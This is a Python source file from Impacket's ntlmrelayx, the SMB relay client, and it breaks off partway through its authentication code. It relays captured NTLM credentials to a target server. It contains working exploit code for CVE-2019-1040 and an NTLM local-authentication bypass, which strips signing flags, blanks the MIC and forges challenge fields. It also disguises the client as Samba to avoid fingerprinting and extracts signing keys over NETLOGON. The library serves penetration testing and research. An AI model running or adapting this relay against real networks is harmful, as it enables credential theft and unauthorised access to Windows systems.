# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SMB Relay Protocol Client
#   This is the SMB client which initiates the connection to an
#   SMB server and relays the credentials to this server.
#
# Author:
#   Alberto Solino (@agsolino)
#

import logging
import os

from binascii import unhexlify, hexlify
from struct import unpack, pack
from socket import error as socketerror
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, NTLMAuthChallengeResponse, \
    generateEncryptedSessionKey, hmac_md5
from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, \
    SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, \
    SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
    SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
from impacket.smbconnection import SMBConnection, SMB_DIALECT
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_SEAL
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5 import scmr

PROTOCOL_CLIENT_CLASS = "SMBRelayClient"

class MYSMB(SMB):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negPacket=negPacket)

    def neg_session(self, negPacket=None):
        return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)

class MYSMB3(SMB3):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None, serverConfig=None):
        self.extendedSecurity = extendedSecurity
        self.serverConfig = serverConfig
        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)

    def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
        # We DON'T want to sign
        self._Connection['ClientSecurityMode'] = 0

        if self.RequireMessageSigning is True:
            # Allow connection if using --remove-mic or --remove-mic-partial exploits
            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
                return

        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
        currentDialect = SMB2_DIALECT_WILDCARD

        # Do we have a negSessionPacket already?
        if negSessionResponse is not None:
            # Yes, let's store the dialect answered back
            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
            currentDialect = negResp['DialectRevision']

        if currentDialect == SMB2_DIALECT_WILDCARD:
            # Still don't know the chosen dialect, let's send our options

            packet = self.SMB_PACKET()
            packet['Command'] = SMB2_NEGOTIATE
            negSession = SMB2Negotiate()

            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
            negSession['Capabilities'] = self._Connection['Capabilities']
            negSession['ClientGuid'] = self.ClientGuid
            if preferredDialect is not None:
                negSession['Dialects'] = [preferredDialect]
            else:
                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
            negSession['DialectCount'] = len(negSession['Dialects'])
            packet['Data'] = negSession

            packetID = self.sendSMB(packet)
            ans = self.recvSMB(packetID)
            if ans.isValidAnswer(STATUS_SUCCESS):
                negResp = SMB2Negotiate_Response(ans['Data'])

        self._Connection['MaxTransactSize']   = min(0x100000,negResp['MaxTransactSize'])
        self._Connection['MaxReadSize']       = min(0x100000,negResp['MaxReadSize'])
        self._Connection['MaxWriteSize']      = min(0x100000,negResp['MaxWriteSize'])
        self._Connection['ServerGuid']        = negResp['ServerGuid']
        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
        self._Connection['Dialect']           = negResp['DialectRevision']
        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
            # Allow connection if using --remove-mic or --remove-mic-partial exploits
            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
                return
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
            self._Connection['SupportsFileLeasing'] = True
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
            self._Connection['SupportsMultiCredit'] = True

        if self._Connection['Dialect'] == SMB2_DIALECT_30:
            # Switching to the right packet format
            self.SMB_PACKET = SMB3Packet
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING) == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
                self._Connection['SupportsDirectoryLeasing'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL) == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
                self._Connection['SupportsMultiChannel'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES) == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
                self._Connection['SupportsPersistentHandles'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
                self._Connection['SupportsEncryption'] = True

            self._Connection['ServerCapabilities'] = negResp['Capabilities']
            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']

class SMBRelayClient(ProtocolClient):
    PLUGIN_NAME = "SMB"
    def __init__(self, serverConfig, target, targetPort = 445, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity

        self.machineAccount = None
        self.machineHashes = None
        self.sessionData = {}

        self.negotiateMessage = None
        self.challengeMessage = None
        self.serverChallenge = None

        self.keepAliveHits = 1

    def netlogonSessionKey(self, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        logging.info("Connecting to %s NETLOGON service" % self.serverConfig.domainIp)

        #respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(authenticateMessageBlob)
        _, machineAccount = self.serverConfig.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')

        try:
            serverName = machineAccount[:len(machineAccount)-1]
        except:
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.serverConfig.domainIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if len(self.serverConfig.machineHashes) > 0:
            lmhash, nthash = self.serverConfig.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(machineAccount, '', domainName, lmhash, nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', b'12345678')

        serverChallenge = resp['ServerChallenge']

        if self.serverConfig.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.serverConfig.machineHashes.split(':')[1])

        sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, ntHash)

        ppp = nrpc.ComputeNetlogonCredential(b'12345678', sessionKey)

        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
                                      ppp, 0x600FFFFF)

        clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
            'user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.serverChallenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 10

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        # request.dump()
        try:
            resp = dce.request(request)
            # resp.dump()
        except DCERPCException as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()

        logging.info("%s\\%s successfully validated through NETLOGON" % (
            domainName, authenticateMessage['user_name'].decode('utf-16le')))

        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != b'':
            signingKey = generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']

        logging.info("SMB Signing key: %s " % hexlify(signingKey).decode('utf-8'))

        return STATUS_SUCCESS, signingKey

    def keepAlive(self):
        # SMB Keep Alive more or less every 5 minutes
        if self.keepAliveHits >= (250 / KEEP_ALIVE_TIMER):
            # Time to send a packet
            # Just a tree connect / disconnect to avoid the session timeout
            tid = self.session.connectTree('IPC$')
            self.session.disconnectTree(tid)
            self.keepAliveHits = 1
        else:
            self.keepAliveHits +=1

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def initConnection(self):
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
                                     #,preferredDialect=SMB_DIALECT)
        if self.serverConfig.smb2support is True:
            data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
        else:
            data = '\x02NT LM 0.12\x00'

        if self.extendedSecurity is True:
            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        else:
            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        try:
            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
                                                  flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
                             flags2=flags2, data=data)
        except Exception as e:
            if not self.serverConfig.smb2support:
                LOG.error('SMBClient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
            else:
                LOG.error('SMBClient error: Connection was reset')
            return False
        if packet[0:1] == b'\xfe':
            preferredDialect = None
            # Currently only works with SMB2_DIALECT_002 or SMB2_DIALECT_21
            if self.serverConfig.remove_target:
                preferredDialect = SMB2_DIALECT_21
            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
                               negPacket=packet, preferredDialect=preferredDialect, serverConfig=self.serverConfig)
        else:
            # Answer is SMB packet, sticking to SMBv1
            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
                              negPacket=packet)

        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                     existingConnection=smbClient, manualNegotiate=True)

        return True

    def setUid(self,uid):
        self._uid = uid

    def sendNegotiate(self, negotiateMessage):
        LOG.debug('[SMB] sendNegotiate: Starting NTLM negotiation')
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)

        original_flags = negoMessage['flags']
        LOG.debug('[SMB] sendNegotiate: Original NTLM flags: 0x%x' % original_flags)

        # When exploiting CVE-2019-1040 or NTLM local auth bypass, remove signing flags
        if self.serverConfig.remove_mic:
            LOG.debug('[SMB] sendNegotiate: Using --remove-mic mode (CVE-2019-1040)')
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
        elif self.serverConfig.remove_mic_partial:
            LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
            # For SMB->SMB: Remove only SIGN/ALWAYS_SIGN, keep SEAL (matches PCAP of local SYSTEM auth)
            # Authentic local SYSTEM auth has SEAL=1, SIGN=1, ALWAYS_SIGN=1 with empty credentials
            # We remove SIGN/ALWAYS_SIGN to avoid signing requirements, but keep SEAL
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            # Keep SEAL flag for SMB->SMB (unlike LDAP/RPC)
            # if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
            #     negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
            LOG.debug('[SMB] sendNegotiate: Keeping SEAL flag for local auth simulation')

        LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
        negotiateMessage = negoMessage.getData()

        challenge = NTLMAuthChallenge()
        if self.session.getDialect() == SMB_DIALECT:
            LOG.debug('[SMB] sendNegotiate: Using SMBv1 dialect')
            challenge.fromString(self.sendNegotiatev1(negotiateMessage))
        else:
            LOG.debug('[SMB] sendNegotiate: Using SMBv2/v3 dialect')
            challenge.fromString(self.sendNegotiatev2(negotiateMessage))

        self.negotiateMessage = negotiateMessage
        self.challengeMessage = challenge.getData()

        # Store the Challenge in our session data dict. It will be used by the SMB Proxy
        self.sessionData['CHALLENGE_MESSAGE'] = challenge
        self.serverChallenge = challenge['challenge']

        # Log challenge details and AV_PAIRS for analysis
        LOG.debug('[SMB] sendNegotiate: Challenge flags: 0x%x' % challenge['flags'])
        if challenge['TargetInfoFields']:
            try:
                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_EOL, NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, \
                    NTLMSSP_AV_DNS_HOSTNAME, NTLMSSP_AV_DNS_DOMAINNAME, NTLMSSP_AV_FLAGS, NTLMSSP_AV_TIME, \
                    NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_CHANNEL_BINDINGS
                av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
                LOG.debug('[SMB] sendNegotiate: Challenge contains AV_PAIRS:')
                av_names = {
                    NTLMSSP_AV_HOSTNAME: 'HOSTNAME',
                    NTLMSSP_AV_DOMAINNAME: 'DOMAINNAME',
                    NTLMSSP_AV_DNS_HOSTNAME: 'DNS_HOSTNAME',
                    NTLMSSP_AV_DNS_DOMAINNAME: 'DNS_DOMAINNAME',
                    NTLMSSP_AV_FLAGS: 'FLAGS',
                    NTLMSSP_AV_TIME: 'TIMESTAMP',
                    NTLMSSP_AV_TARGET_NAME: 'TARGET_NAME',
                    NTLMSSP_AV_CHANNEL_BINDINGS: 'CHANNEL_BINDINGS',
                }
                for key in av_pairs.fields:
                    name = av_names.get(key, 'UNKNOWN_0x%02x' % key)
                    value = av_pairs[key]
                    if key == NTLMSSP_AV_FLAGS and value:
                        # Decode flags value
                        flags_val = int.from_bytes(value[1], byteorder='little') if len(value) > 1 else 0
                        LOG.debug('[SMB] sendNegotiate:   %s = 0x%08x' % (name, flags_val))
                    elif key in [NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, NTLMSSP_AV_DNS_HOSTNAME,
                                 NTLMSSP_AV_DNS_DOMAINNAME, NTLMSSP_AV_TARGET_NAME]:
                        try:
                            text = value[1].decode('utf-16le') if len(value) > 1 else ''
                            LOG.debug('[SMB] sendNegotiate:   %s = "%s"' % (name, text))
                        except:
                            LOG.debug('[SMB] sendNegotiate:   %s = %r' % (name, value))
                    else:
                        LOG.debug('[SMB] sendNegotiate:   %s = %r' % (name, value))
            except Exception as e:
                LOG.debug('[SMB] sendNegotiate: Could not parse challenge AV_PAIRS: %s' % str(e))

        # For --remove-mic-partial mode, modify challenge AV_PAIRS to signal local authentication
        if self.serverConfig.remove_mic_partial and challenge['TargetInfoFields']:
            try:
                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_FLAGS
                av_pairs = AV_PAIRS(challenge['TargetInfoFields'])

                # Add TARGET_NAME as "cifs/localhost" to signal local authentication
                # This is what Windows uses for local loopback connections
                # Note: AV_PAIRS.__setitem__ automatically wraps value with (len, value)
                target_name = 'cifs/localhost'.encode('utf-16le')
                av_pairs[NTLMSSP_AV_TARGET_NAME] = target_name
                LOG.debug('[SMB] sendNegotiate: Modified challenge - added TARGET_NAME = "cifs/localhost"')

                # Optionally add AV_FLAGS with MIC present flag (0x00000002)
                # This signals that MIC is expected in the response
                av_flags_value = (0x00000002).to_bytes(4, byteorder='little')
                av_pairs[NTLMSSP_AV_FLAGS] = av_flags_value
                LOG.debug('[SMB] sendNegotiate: Modified challenge - added AV_FLAGS = 0x00000002 (MIC present)')

                # Update the challenge with modified AV_PAIRS
                challenge['TargetInfoFields'] = av_pairs.getData()
                self.challengeMessage = challenge.getData()
                LOG.debug('[SMB] sendNegotiate: Challenge AV_PAIRS modified for local auth simulation')
            except Exception as e:
                LOG.error('[SMB] sendNegotiate: Failed to modify challenge AV_PAIRS: %s' % str(e))
                import traceback
                traceback.print_exc()

        LOG.debug('[SMB] sendNegotiate: Received challenge from server, returning to relay')
        return challenge

    def sendNegotiatev2(self, negotiateMessage):
        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        sessionSetup['SecurityBufferLength'] = len(negotiateMessage)
        sessionSetup['Buffer'] = negotiateMessage

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data'] = sessionSetup

        packetID = v2client.sendSMB(packet)
        ans = v2client.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            v2client._Session['SessionID'] = ans['SessionID']
            sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
            return sessionSetupResponse['Buffer']

        return False

    def sendNegotiatev1(self, negotiateMessage):
        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE

        # Just in case, clear the Unicode Flag
        flags2 = v1client.get_flags ()[1]
        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_UNICODE))

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        #blob = SPNEGO_NegTokenInit()

        # NTLMSSP
        #blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        #blob['MechToken'] = negotiateMessage

        #sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters']['SecurityBlobLength']  = len(negotiateMessage)
        sessionSetup['Parameters'].getData()
        #sessionSetup['Data']['SecurityBlob'] = blob.getData()
        sessionSetup['Data']['SecurityBlob'] = negotiateMessage

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)
        smb = v1client.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            LOG.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            v1client.set_uid(smb['Uid'])

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            #respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            #return respToken['ResponseToken']
            return sessionData['SecurityBlob']

    def sendStandardSecurityAuth(self, sessionSetupData):
        v1client = self.session.getSMBServer()
        flags2 = v1client.get_flags()[1]
        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_EXTENDED_SECURITY))
        if sessionSetupData['Account'] != '':
            smb = NewSMBPacket()
            smb['Flags1'] = 8

            sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
            sessionSetup['Data'] = SMBSessionSetupAndX_Data()

            sessionSetup['Parameters']['MaxBuffer'] = 65535
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VCNumber'] = os.getpid()
            sessionSetup['Parameters']['SessionKey'] = v1client._dialects_parameters['SessionKey']
            sessionSetup['Parameters']['AnsiPwdLength'] = len(sessionSetupData['AnsiPwd'])
            sessionSetup['Parameters']['UnicodePwdLength'] = len(sessionSetupData['UnicodePwd'])
            sessionSetup['Parameters']['Capabilities'] = SMB.CAP_RAW_MODE

            sessionSetup['Data']['AnsiPwd'] = sessionSetupData['AnsiPwd']
            sessionSetup['Data']['UnicodePwd'] = sessionSetupData['UnicodePwd']
            sessionSetup['Data']['Account'] = sessionSetupData['Account']
            sessionSetup['Data']['PrimaryDomain'] = sessionSetupData['PrimaryDomain']
            sessionSetup['Data']['NativeOS'] = 'Unix'
            sessionSetup['Data']['NativeLanMan'] = 'Samba'

            smb.addCommand(sessionSetup)

            v1client.sendSMB(smb)
            smb = v1client.recvSMB()
            try:
                smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
            except:
                return None, STATUS_LOGON_FAILURE
            else:
                v1client.set_uid(smb['Uid'])
                return smb, STATUS_SUCCESS
        else:
            # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
            clientResponse = None
            errorCode = STATUS_ACCESS_DENIED

        return clientResponse, errorCode

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        LOG.debug('[SMB] sendAuth: Starting authentication with server')

        # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
        if self.serverConfig.remove_mic:
            LOG.debug('[SMB] sendAuth: Applying --remove-mic transformations')
            # Check if SPNEGO-wrapped and unwrap if needed
            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
                authenticateMessageBlob = respToken2['ResponseToken']

            authMessage = NTLMAuthChallengeResponse()
            authMessage.fromString(authenticateMessageBlob)
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            authenticateMessageBlob = authMessage.getData()
        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
        elif self.serverConfig.remove_mic_partial:
            LOG.debug('[SMB] sendAuth: Applying --remove-mic-partial transformations')
            LOG.debug('[SMB] sendAuth: authenticateMessageBlob length: %d, first byte: 0x%x' % (len(authenticateMessageBlob), authenticateMessageBlob[0]))

            # Check if SPNEGO-wrapped and unwrap if needed
            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
                LOG.debug('[SMB] sendAuth: Unwrapping SPNEGO')
                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
                authenticateMessageBlob = respToken2['ResponseToken']
                LOG.debug('[SMB] sendAuth: SPNEGO unwrapped, new length: %d' % len(authenticateMessageBlob))

            authMessage = NTLMAuthChallengeResponse()
            LOG.debug('[SMB] sendAuth: Created NTLMAuthChallengeResponse object, about to parse')
            authMessage.fromString(authenticateMessageBlob)
            LOG.debug('[SMB] sendAuth: Successfully parsed NTLM message')

            # Log the username and domain being authenticated
            try:
                username = authMessage['user_name'].decode('utf-16le') if authMessage['user_name'] else ''
                domain = authMessage['domain_name'].decode('utf-16le') if authMessage['domain_name'] else ''
                LOG.debug('[SMB] sendAuth: Authenticating as user: "%s", domain: "%s"' % (username, domain))
            except:
                LOG.debug('[SMB] sendAuth: Could not decode username/domain')

            original_flags = authMessage['flags']
            LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)

            # For SMB->SMB: Remove only SIGN/ALWAYS_SIGN, keep SEAL (matches PCAP)
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
